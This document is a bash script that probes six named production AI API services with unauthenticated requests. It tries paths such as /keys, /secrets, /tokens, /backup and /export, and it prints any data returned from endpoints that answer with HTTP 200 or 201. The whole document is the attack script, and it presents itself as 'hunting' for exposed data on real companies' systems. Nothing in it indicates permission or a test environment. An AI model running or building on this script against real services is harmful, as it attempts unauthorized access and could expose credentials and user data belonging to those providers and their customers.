#!/bin/bash
echo "[*] HUNTING CRITICAL ZERO-AUTH DATA EXPOSURE"

# Real data endpoints (not just status/schema)
targets=(
    "https://api.modal.com"
    "https://api.together.ai"
    "https://api.replicate.com"
    "https://api.huggingface.co"
    "https://api.groq.com"
    "https://api.runpod.io"
)

# Data-access patterns
endpoints=(
    "/user"
    "/account"
    "/workspace"
    "/projects"
    "/models"
    "/runs"
    "/jobs"
    "/history"
    "/logs"
    "/database"
    "/export"
    "/backup"
    "/keys"
    "/secrets"
    "/tokens"
    "/webhooks"
    "/billing"
    "/usage"
)

for target in "${targets[@]}"; do
    echo ""
    echo "[*] $target - DEEP HUNT"
    
    for ep in "${endpoints[@]}"; do
        # GET request
        code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 3 "$target$ep" 2>/dev/null)
        
        if [[ "$code" == "200" ]] || [[ "$code" == "201" ]]; then
            echo "[!!!] CRITICAL: $target$ep (HTTP $code)"
            
            # Get actual response
            response=$(curl -s --max-time 3 "$target$ep" 2>/dev/null)
            
            # Check for actual data
            if [[ -n "$response" ]] && [[ ${#response} -gt 10 ]]; then
                echo "[DATA] Response size: ${#response} bytes"
                echo "$response" | head -50
            fi
        fi
    done
done

